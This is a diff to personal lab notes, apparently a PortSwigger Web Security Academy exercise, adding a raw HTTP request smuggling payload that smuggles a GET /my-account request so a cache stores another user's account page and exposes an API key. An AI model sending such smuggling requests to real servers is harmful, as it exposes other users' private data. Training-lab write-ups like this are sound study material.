@@ -685,6 +685,45 @@ Should get an alert textbox when we refresh site
 
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ac612921-6dbb-4fbf-9df2-be98df4f6a19)
 
+**Exploiting HTTP request smuggling to perform web cache deception**
+
+```
+Login  
+Capture response and changed to smuggle
+POST / HTTP/1.1
+Host: 0ab400b6040218b282d3152200d6004f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+Transfer-Encoding: chunked
+
+0
+
+GET /my-account HTTP/1.1
+X-Ignore: X
+```
+
+
+
+
+
+Open home link in incognito 
+
+
+
+We can use burpe search to look for api key (PRO version) but saw it in the following 
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
